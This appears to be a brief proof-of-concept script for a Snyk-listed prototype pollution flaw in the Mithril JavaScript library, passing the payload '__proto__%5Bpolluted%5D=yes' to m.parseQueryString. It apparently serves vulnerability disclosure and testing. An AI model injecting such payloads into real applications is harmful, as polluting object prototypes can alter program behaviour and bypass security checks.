//https://snyk.io/vuln/SNYK-JS-MITHRIL-460113
 
  require("mithril/test-utils/browserMock")(global);
  const m = require("mithril");
  obj = {};

   

  m.parseQueryString("__proto__%5Bpolluted%5D=yes");
// End of file
